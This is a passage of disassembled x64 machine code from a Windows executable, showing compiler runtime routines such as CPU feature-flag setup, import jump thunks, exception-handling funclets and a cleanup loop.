   140003ad5:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140003ada:	48 8b 05 af 45 00 00 	mov    0x45af(%rip),%rax        # 0x140008090
   140003ae1:	44 23 c9             	and    %ecx,%r9d
   140003ae4:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140003ae8:	48 89 05 a1 45 00 00 	mov    %rax,0x45a1(%rip)        # 0x140008090
   140003aef:	44 3b c9             	cmp    %ecx,%r9d
   140003af2:	75 37                	jne    0x140003b2b
   140003af4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003af9:	22 c2                	and    %dl,%al
   140003afb:	3a c2                	cmp    %dl,%al
   140003afd:	75 25                	jne    0x140003b24
   140003aff:	48 8b 05 8a 45 00 00 	mov    0x458a(%rip),%rax        # 0x140008090
   140003b06:	83 0d 8f 45 00 00 40 	orl    $0x40,0x458f(%rip)        # 0x14000809c
   140003b0d:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140003b11:	c7 05 7d 45 00 00 06 	movl   $0x6,0x457d(%rip)        # 0x140008098
   140003b18:	00 00 00 
   140003b1b:	48 89 05 6e 45 00 00 	mov    %rax,0x456e(%rip)        # 0x140008090
   140003b22:	eb 07                	jmp    0x140003b2b
   140003b24:	48 8b 05 65 45 00 00 	mov    0x4565(%rip),%rax        # 0x140008090
   140003b2b:	0f ba e6 17          	bt     $0x17,%esi
   140003b2f:	73 0c                	jae    0x140003b3d
   140003b31:	48 0f ba f0 18       	btr    $0x18,%rax
   140003b36:	48 89 05 53 45 00 00 	mov    %rax,0x4553(%rip)        # 0x140008090
   140003b3d:	41 0f ba e2 13       	bt     $0x13,%r10d
   140003b42:	73 4a                	jae    0x140003b8e
   140003b44:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003b49:	22 c2                	and    %dl,%al
   140003b4b:	3a c2                	cmp    %dl,%al
   140003b4d:	75 3f                	jne    0x140003b8e
   140003b4f:	41 8b cb             	mov    %r11d,%ecx
   140003b52:	41 8b c3             	mov    %r11d,%eax
   140003b55:	48 c1 e9 10          	shr    $0x10,%rcx
   140003b59:	25 ff 00 04 00       	and    $0x400ff,%eax
   140003b5e:	83 e1 06             	and    $0x6,%ecx
   140003b61:	89 05 05 4c 00 00    	mov    %eax,0x4c05(%rip)        # 0x14000876c
   140003b67:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   140003b6e:	48 f7 d1             	not    %rcx
   140003b71:	48 23 0d 18 45 00 00 	and    0x4518(%rip),%rcx        # 0x140008090
   140003b78:	48 89 0d 11 45 00 00 	mov    %rcx,0x4511(%rip)        # 0x140008090
   140003b7f:	3c 01                	cmp    $0x1,%al
   140003b81:	76 0b                	jbe    0x140003b8e
   140003b83:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140003b87:	48 89 0d 02 45 00 00 	mov    %rcx,0x4502(%rip)        # 0x140008090
   140003b8e:	41 0f ba e2 15       	bt     $0x15,%r10d
   140003b93:	73 15                	jae    0x140003baa
   140003b95:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003b9a:	48 0f ba e0 13       	bt     $0x13,%rax
   140003b9f:	73 09                	jae    0x140003baa
   140003ba1:	48 0f ba 35 e6 44 00 	btrq   $0x7,0x44e6(%rip)        # 0x140008090
   140003ba8:	00 07 
   140003baa:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140003baf:	33 c0                	xor    %eax,%eax
   140003bb1:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140003bb6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003bbb:	48 83 c4 10          	add    $0x10,%rsp
   140003bbf:	5f                   	pop    %rdi
   140003bc0:	c3                   	ret
   140003bc1:	cc                   	int3
   140003bc2:	cc                   	int3
   140003bc3:	cc                   	int3
   140003bc4:	33 c0                	xor    %eax,%eax
   140003bc6:	39 05 e4 44 00 00    	cmp    %eax,0x44e4(%rip)        # 0x1400080b0
   140003bcc:	0f 95 c0             	setne  %al
   140003bcf:	c3                   	ret
   140003bd0:	48 83 ec 28          	sub    $0x28,%rsp
   140003bd4:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140003bd8:	48 8b ca             	mov    %rdx,%rcx
   140003bdb:	49 8b d1             	mov    %r9,%rdx
   140003bde:	e8 0d 00 00 00       	call   0x140003bf0
   140003be3:	b8 01 00 00 00       	mov    $0x1,%eax
   140003be8:	48 83 c4 28          	add    $0x28,%rsp
   140003bec:	c3                   	ret
   140003bed:	cc                   	int3
   140003bee:	cc                   	int3
   140003bef:	cc                   	int3
   140003bf0:	40 53                	rex push %rbx
   140003bf2:	45 8b 18             	mov    (%r8),%r11d
   140003bf5:	48 8b da             	mov    %rdx,%rbx
   140003bf8:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140003bfc:	4c 8b c9             	mov    %rcx,%r9
   140003bff:	41 f6 00 04          	testb  $0x4,(%r8)
   140003c03:	4c 8b d1             	mov    %rcx,%r10
   140003c06:	74 13                	je     0x140003c1b
   140003c08:	41 8b 40 08          	mov    0x8(%r8),%eax
   140003c0c:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140003c10:	f7 d8                	neg    %eax
   140003c12:	4c 03 d1             	add    %rcx,%r10
   140003c15:	48 63 c8             	movslq %eax,%rcx
   140003c18:	4c 23 d1             	and    %rcx,%r10
   140003c1b:	49 63 c3             	movslq %r11d,%rax
   140003c1e:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140003c22:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140003c26:	8b 48 08             	mov    0x8(%rax),%ecx
   140003c29:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003c2d:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140003c32:	74 10                	je     0x140003c44
   140003c34:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140003c39:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   140003c3e:	48 23 c1             	and    %rcx,%rax
   140003c41:	4c 03 c8             	add    %rax,%r9
   140003c44:	4c 33 ca             	xor    %rdx,%r9
   140003c47:	49 8b c9             	mov    %r9,%rcx
   140003c4a:	5b                   	pop    %rbx
   140003c4b:	e9 b0 f0 ff ff       	jmp    0x140002d00
   140003c50:	ff 25 02 16 00 00    	jmp    *0x1602(%rip)        # 0x140005258
   140003c56:	ff 25 cc 15 00 00    	jmp    *0x15cc(%rip)        # 0x140005228
   140003c5c:	ff 25 be 15 00 00    	jmp    *0x15be(%rip)        # 0x140005220
   140003c62:	ff 25 b0 15 00 00    	jmp    *0x15b0(%rip)        # 0x140005218
   140003c68:	ff 25 a2 15 00 00    	jmp    *0x15a2(%rip)        # 0x140005210
   140003c6e:	ff 25 94 15 00 00    	jmp    *0x1594(%rip)        # 0x140005208
   140003c74:	ff 25 ce 15 00 00    	jmp    *0x15ce(%rip)        # 0x140005248
   140003c7a:	ff 25 e8 15 00 00    	jmp    *0x15e8(%rip)        # 0x140005268
   140003c80:	ff 25 ea 15 00 00    	jmp    *0x15ea(%rip)        # 0x140005270
   140003c86:	ff 25 ec 15 00 00    	jmp    *0x15ec(%rip)        # 0x140005278
   140003c8c:	ff 25 26 16 00 00    	jmp    *0x1626(%rip)        # 0x1400052b8
   140003c92:	ff 25 18 16 00 00    	jmp    *0x1618(%rip)        # 0x1400052b0
   140003c98:	ff 25 3a 16 00 00    	jmp    *0x163a(%rip)        # 0x1400052d8
   140003c9e:	ff 25 fc 15 00 00    	jmp    *0x15fc(%rip)        # 0x1400052a0
   140003ca4:	ff 25 66 16 00 00    	jmp    *0x1666(%rip)        # 0x140005310
   140003caa:	ff 25 58 16 00 00    	jmp    *0x1658(%rip)        # 0x140005308
   140003cb0:	ff 25 1a 16 00 00    	jmp    *0x161a(%rip)        # 0x1400052d0
   140003cb6:	ff 25 64 16 00 00    	jmp    *0x1664(%rip)        # 0x140005320
   140003cbc:	ff 25 1e 16 00 00    	jmp    *0x161e(%rip)        # 0x1400052e0
   140003cc2:	ff 25 50 16 00 00    	jmp    *0x1650(%rip)        # 0x140005318
   140003cc8:	ff 25 1a 16 00 00    	jmp    *0x161a(%rip)        # 0x1400052e8
   140003cce:	ff 25 74 16 00 00    	jmp    *0x1674(%rip)        # 0x140005348
   140003cd4:	ff 25 4e 16 00 00    	jmp    *0x164e(%rip)        # 0x140005328
   140003cda:	ff 25 e0 15 00 00    	jmp    *0x15e0(%rip)        # 0x1400052c0
   140003ce0:	ff 25 e2 15 00 00    	jmp    *0x15e2(%rip)        # 0x1400052c8
   140003ce6:	ff 25 a4 15 00 00    	jmp    *0x15a4(%rip)        # 0x140005290
   140003cec:	ff 25 8e 15 00 00    	jmp    *0x158e(%rip)        # 0x140005280
   140003cf2:	ff 25 48 16 00 00    	jmp    *0x1648(%rip)        # 0x140005340
   140003cf8:	ff 25 f2 15 00 00    	jmp    *0x15f2(%rip)        # 0x1400052f0
   140003cfe:	ff 25 f4 15 00 00    	jmp    *0x15f4(%rip)        # 0x1400052f8
   140003d04:	ff 25 f6 15 00 00    	jmp    *0x15f6(%rip)        # 0x140005300
   140003d0a:	cc                   	int3
   140003d0b:	cc                   	int3
   140003d0c:	48 8b c4             	mov    %rsp,%rax
   140003d0f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003d13:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140003d17:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003d1b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003d1f:	41 56                	push   %r14
   140003d21:	48 83 ec 20          	sub    $0x20,%rsp
   140003d25:	49 8b 59 38          	mov    0x38(%r9),%rbx
   140003d29:	48 8b f2             	mov    %rdx,%rsi
   140003d2c:	4d 8b f0             	mov    %r8,%r14
   140003d2f:	48 8b e9             	mov    %rcx,%rbp
   140003d32:	49 8b d1             	mov    %r9,%rdx
   140003d35:	48 8b ce             	mov    %rsi,%rcx
   140003d38:	49 8b f9             	mov    %r9,%rdi
   140003d3b:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   140003d3f:	e8 ac fe ff ff       	call   0x140003bf0
   140003d44:	8b 45 04             	mov    0x4(%rbp),%eax
   140003d47:	24 66                	and    $0x66,%al
   140003d49:	f6 d8                	neg    %al
   140003d4b:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d50:	45 1b c9             	sbb    %r9d,%r9d
   140003d53:	41 f7 d9             	neg    %r9d
   140003d56:	44 03 c8             	add    %eax,%r9d
   140003d59:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   140003d5d:	74 11                	je     0x140003d70
   140003d5f:	4c 8b cf             	mov    %rdi,%r9
   140003d62:	4d 8b c6             	mov    %r14,%r8
   140003d65:	48 8b d6             	mov    %rsi,%rdx
   140003d68:	48 8b cd             	mov    %rbp,%rcx
   140003d6b:	e8 e0 fe ff ff       	call   0x140003c50
   140003d70:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003d75:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003d7a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003d7f:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140003d84:	48 83 c4 20          	add    $0x20,%rsp
   140003d88:	41 5e                	pop    %r14
   140003d8a:	c3                   	ret
   140003d8b:	ff 25 af 14 00 00    	jmp    *0x14af(%rip)        # 0x140005240
   140003d91:	cc                   	int3
   140003d92:	cc                   	int3
   140003d93:	cc                   	int3
   140003d94:	cc                   	int3
   140003d95:	cc                   	int3
   140003d96:	cc                   	int3
   140003d97:	cc                   	int3
   140003d98:	cc                   	int3
   140003d99:	cc                   	int3
   140003d9a:	cc                   	int3
   140003d9b:	cc                   	int3
   140003d9c:	cc                   	int3
   140003d9d:	cc                   	int3
   140003d9e:	cc                   	int3
   140003d9f:	cc                   	int3
   140003da0:	cc                   	int3
   140003da1:	cc                   	int3
   140003da2:	cc                   	int3
   140003da3:	cc                   	int3
   140003da4:	cc                   	int3
   140003da5:	cc                   	int3
   140003da6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003dad:	00 00 00 
   140003db0:	ff e0                	jmp    *%rax
   140003db2:	cc                   	int3
   140003db3:	cc                   	int3
   140003db4:	cc                   	int3
   140003db5:	cc                   	int3
   140003db6:	cc                   	int3
   140003db7:	cc                   	int3
   140003db8:	cc                   	int3
   140003db9:	cc                   	int3
   140003dba:	cc                   	int3
   140003dbb:	cc                   	int3
   140003dbc:	cc                   	int3
   140003dbd:	cc                   	int3
   140003dbe:	cc                   	int3
   140003dbf:	cc                   	int3
   140003dc0:	cc                   	int3
   140003dc1:	cc                   	int3
   140003dc2:	cc                   	int3
   140003dc3:	cc                   	int3
   140003dc4:	cc                   	int3
   140003dc5:	cc                   	int3
   140003dc6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003dcd:	00 00 00 
   140003dd0:	ff 25 ea 15 00 00    	jmp    *0x15ea(%rip)        # 0x1400053c0
   140003dd6:	cc                   	int3
   140003dd7:	cc                   	int3
   140003dd8:	cc                   	int3
   140003dd9:	cc                   	int3
   140003dda:	cc                   	int3
   140003ddb:	cc                   	int3
   140003ddc:	cc                   	int3
   140003ddd:	cc                   	int3
   140003dde:	cc                   	int3
   140003ddf:	cc                   	int3
   140003de0:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   140003de7:	e9 24 d5 ff ff       	jmp    0x140001310
   140003dec:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140003df3:	e9 18 d5 ff ff       	jmp    0x140001310
   140003df8:	48 8d 8a 20 01 00 00 	lea    0x120(%rdx),%rcx
   140003dff:	e9 0c d5 ff ff       	jmp    0x140001310
   140003e04:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140003e0b:	e9 00 d5 ff ff       	jmp    0x140001310
   140003e10:	40 55                	rex push %rbp
   140003e12:	48 83 ec 20          	sub    $0x20,%rsp
   140003e16:	48 8b ea             	mov    %rdx,%rbp
   140003e19:	ba 18 00 00 00       	mov    $0x18,%edx
   140003e1e:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140003e22:	e8 f9 ee ff ff       	call   0x140002d20
   140003e27:	48 83 c4 20          	add    $0x20,%rsp
   140003e2b:	5d                   	pop    %rbp
   140003e2c:	c3                   	ret
   140003e2d:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140003e34:	e9 67 d4 ff ff       	jmp    0x1400012a0
   140003e39:	40 55                	rex push %rbp
   140003e3b:	48 83 ec 20          	sub    $0x20,%rsp
   140003e3f:	48 8b ea             	mov    %rdx,%rbp
   140003e42:	ba 18 00 00 00       	mov    $0x18,%edx
   140003e47:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140003e4b:	e8 d0 ee ff ff       	call   0x140002d20
   140003e50:	48 83 c4 20          	add    $0x20,%rsp
   140003e54:	5d                   	pop    %rbp
   140003e55:	c3                   	ret
   140003e56:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140003e5d:	e9 3e d4 ff ff       	jmp    0x1400012a0
   140003e62:	40 55                	rex push %rbp
   140003e64:	48 83 ec 20          	sub    $0x20,%rsp
   140003e68:	48 8b ea             	mov    %rdx,%rbp
   140003e6b:	ba 18 00 00 00       	mov    $0x18,%edx
   140003e70:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140003e74:	e8 a7 ee ff ff       	call   0x140002d20
   140003e79:	48 83 c4 20          	add    $0x20,%rsp
   140003e7d:	5d                   	pop    %rbp
   140003e7e:	c3                   	ret
   140003e7f:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140003e86:	e9 15 d4 ff ff       	jmp    0x1400012a0
   140003e8b:	40 55                	rex push %rbp
   140003e8d:	48 83 ec 20          	sub    $0x20,%rsp
   140003e91:	48 8b ea             	mov    %rdx,%rbp
   140003e94:	ba 18 00 00 00       	mov    $0x18,%edx
   140003e99:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140003e9d:	e8 7e ee ff ff       	call   0x140002d20
   140003ea2:	48 83 c4 20          	add    $0x20,%rsp
   140003ea6:	5d                   	pop    %rbp
   140003ea7:	c3                   	ret
   140003ea8:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140003eaf:	e9 ec d3 ff ff       	jmp    0x1400012a0
   140003eb4:	40 55                	rex push %rbp
   140003eb6:	48 83 ec 20          	sub    $0x20,%rsp
   140003eba:	48 8b ea             	mov    %rdx,%rbp
   140003ebd:	ba 18 00 00 00       	mov    $0x18,%edx
   140003ec2:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140003ec6:	e8 55 ee ff ff       	call   0x140002d20
   140003ecb:	48 83 c4 20          	add    $0x20,%rsp
   140003ecf:	5d                   	pop    %rbp
   140003ed0:	c3                   	ret
   140003ed1:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140003ed8:	e9 c3 d3 ff ff       	jmp    0x1400012a0
   140003edd:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   140003ee4:	e9 27 d4 ff ff       	jmp    0x140001310
   140003ee9:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140003ef0:	e9 1b d4 ff ff       	jmp    0x140001310
   140003ef5:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   140003efc:	e9 0f d4 ff ff       	jmp    0x140001310
   140003f01:	40 55                	rex push %rbp
   140003f03:	48 83 ec 20          	sub    $0x20,%rsp
   140003f07:	48 8b ea             	mov    %rdx,%rbp
   140003f0a:	ba 18 00 00 00       	mov    $0x18,%edx
   140003f0f:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140003f13:	e8 08 ee ff ff       	call   0x140002d20
   140003f18:	48 83 c4 20          	add    $0x20,%rsp
   140003f1c:	5d                   	pop    %rbp
   140003f1d:	c3                   	ret
   140003f1e:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140003f25:	e9 76 d3 ff ff       	jmp    0x1400012a0
   140003f2a:	cc                   	int3
   140003f2b:	cc                   	int3
   140003f2c:	cc                   	int3
   140003f2d:	cc                   	int3
   140003f2e:	cc                   	int3
   140003f2f:	cc                   	int3
   140003f30:	48 8d 8a 90 01 00 00 	lea    0x190(%rdx),%rcx
   140003f37:	e9 14 e6 ff ff       	jmp    0x140002550
   140003f3c:	48 8d 8a 40 00 00 00 	lea    0x40(%rdx),%rcx
   140003f43:	e9 08 e6 ff ff       	jmp    0x140002550
   140003f48:	48 8d 8a 60 00 00 00 	lea    0x60(%rdx),%rcx
   140003f4f:	e9 fc e5 ff ff       	jmp    0x140002550
   140003f54:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   140003f5b:	e9 f0 e5 ff ff       	jmp    0x140002550
   140003f60:	48 8d 8a a0 00 00 00 	lea    0xa0(%rdx),%rcx
   140003f67:	e9 e4 e5 ff ff       	jmp    0x140002550
   140003f6c:	48 8d 8a c0 00 00 00 	lea    0xc0(%rdx),%rcx
   140003f73:	e9 d8 e5 ff ff       	jmp    0x140002550
   140003f78:	48 8d 8a e0 00 00 00 	lea    0xe0(%rdx),%rcx
   140003f7f:	e9 cc e5 ff ff       	jmp    0x140002550
   140003f84:	40 55                	rex push %rbp
   140003f86:	48 83 ec 20          	sub    $0x20,%rsp
   140003f8a:	48 8b ea             	mov    %rdx,%rbp
   140003f8d:	4c 8d 0d bc e5 ff ff 	lea    -0x1a44(%rip),%r9        # 0x140002550
   140003f94:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140003f9a:	ba 20 00 00 00       	mov    $0x20,%edx
   140003f9f:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   140003fa3:	e8 bc ed ff ff       	call   0x140002d64
   140003fa8:	48 83 c4 20          	add    $0x20,%rsp
   140003fac:	5d                   	pop    %rbp
   140003fad:	c3                   	ret
   140003fae:	48 8d 8a 38 01 00 00 	lea    0x138(%rdx),%rcx
   140003fb5:	e9 76 eb ff ff       	jmp    0x140002b30
   140003fba:	48 8d 8a 70 01 00 00 	lea    0x170(%rdx),%rcx
   140003fc1:	e9 7a e5 ff ff       	jmp    0x140002540
   140003fc6:	cc                   	int3
   140003fc7:	cc                   	int3
   140003fc8:	cc                   	int3
   140003fc9:	cc                   	int3
   140003fca:	cc                   	int3
   140003fcb:	cc                   	int3
   140003fcc:	cc                   	int3
   140003fcd:	cc                   	int3
   140003fce:	cc                   	int3
   140003fcf:	cc                   	int3
   140003fd0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140003fd7:	e9 64 eb ff ff       	jmp    0x140002b40
   140003fdc:	40 55                	rex push %rbp
   140003fde:	48 83 ec 20          	sub    $0x20,%rsp
   140003fe2:	48 8b ea             	mov    %rdx,%rbp
   140003fe5:	80 7d 20 00          	cmpb   $0x0,0x20(%rbp)
   140003fe9:	75 16                	jne    0x140004001
   140003feb:	4c 8b 4d 78          	mov    0x78(%rbp),%r9
   140003fef:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   140003ff3:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   140003ff7:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140003ffb:	e8 d0 ed ff ff       	call   0x140002dd0
   140004000:	90                   	nop
   140004001:	48 83 c4 20          	add    $0x20,%rsp
   140004005:	5d                   	pop    %rbp
   140004006:	c3                   	ret
   140004007:	cc                   	int3
   140004008:	40 53                	rex push %rbx
   14000400a:	55                   	push   %rbp
   14000400b:	48 83 ec 28          	sub    $0x28,%rsp
   14000400f:	48 8b ea             	mov    %rdx,%rbp
   140004012:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   140004016:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000401a:	48 8b 08             	mov    (%rax),%rcx
   14000401d:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   140004021:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004025:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000402b:	74 0c                	je     0x140004039
   14000402d:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   140004034:	8b 45 20             	mov    0x20(%rbp),%eax
   140004037:	eb 22                	jmp    0x14000405b
   140004039:	e8 2a fc ff ff       	call   0x140003c68
   14000403e:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140004042:	48 89 08             	mov    %rcx,(%rax)
   140004045:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140004049:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000404d:	e8 1c fc ff ff       	call   0x140003c6e
   140004052:	48 89 18             	mov    %rbx,(%rax)
   140004055:	e8 32 fc ff ff       	call   0x140003c8c
   14000405a:	90                   	nop
   14000405b:	48 83 c4 28          	add    $0x28,%rsp
   14000405f:	5d                   	pop    %rbp
   140004060:	5b                   	pop    %rbx
   140004061:	c3                   	ret
   140004062:	cc                   	int3
   140004063:	40 55                	rex push %rbp
   140004065:	48 83 ec 20          	sub    $0x20,%rsp
   140004069:	48 8b ea             	mov    %rdx,%rbp
   14000406c:	48 8b d1             	mov    %rcx,%rdx
   14000406f:	48 8b 09             	mov    (%rcx),%rcx
   140004072:	8b 09                	mov    (%rcx),%ecx
   140004074:	e8 19 fc ff ff       	call   0x140003c92
   140004079:	90                   	nop
   14000407a:	48 83 c4 20          	add    $0x20,%rsp
   14000407e:	5d                   	pop    %rbp
   14000407f:	c3                   	ret
   140004080:	cc                   	int3
   140004081:	40 55                	rex push %rbp
   140004083:	48 8b ea             	mov    %rdx,%rbp
   140004086:	48 8b 01             	mov    (%rcx),%rax
   140004089:	33 c9                	xor    %ecx,%ecx
   14000408b:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140004091:	0f 94 c1             	sete   %cl
   140004094:	8b c1                	mov    %ecx,%eax
   140004096:	5d                   	pop    %rbp
   140004097:	c3                   	ret
   140004098:	cc                   	int3
   140004099:	cc                   	int3
   14000409a:	cc                   	int3
   14000409b:	cc                   	int3
   14000409c:	40 53                	rex push %rbx
   14000409e:	48 83 ec 20          	sub    $0x20,%rsp
   1400040a2:	eb 3d                	jmp    0x1400040e1
   1400040a4:	48 8b 03             	mov    (%rbx),%rax
   1400040a7:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400040ab:	48 89 05 ce 40 00 00 	mov    %rax,0x40ce(%rip)        # 0x140008180
   1400040b2:	48 8b 01             	mov    (%rcx),%rax
   1400040b5:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400040b9:	ff 15 01 13 00 00    	call   *0x1301(%rip)        # 0x1400053c0
   1400040bf:	48 8b c8             	mov    %rax,%rcx
   1400040c2:	48 85 c0             	test   %rax,%rax
   1400040c5:	74 11                	je     0x1400040d8
   1400040c7:	48 8b 10             	mov    (%rax),%rdx
   1400040ca:	48 8b 02             	mov    (%rdx),%rax
   1400040cd:	ba 01 00 00 00       	mov    $0x1,%edx
   1400040d2:	ff 15 e8 12 00 00    	call   *0x12e8(%rip)        # 0x1400053c0
   1400040d8:	48 8b cb             	mov    %rbx,%rcx
   1400040db:	ff 15 87 11 00 00    	call   *0x1187(%rip)        # 0x140005268
   1400040e1:	48 8b 1d 98 40 00 00 	mov    0x4098(%rip),%rbx        # 0x140008180
   1400040e8:	48 85 db             	test   %rbx,%rbx
   1400040eb:	75 b7                	jne    0x1400040a4
   1400040ed:	48 83 c4 20          	add    $0x20,%rsp
   1400040f1:	5b                   	pop    %rbx
   1400040f2:	c3                   	ret
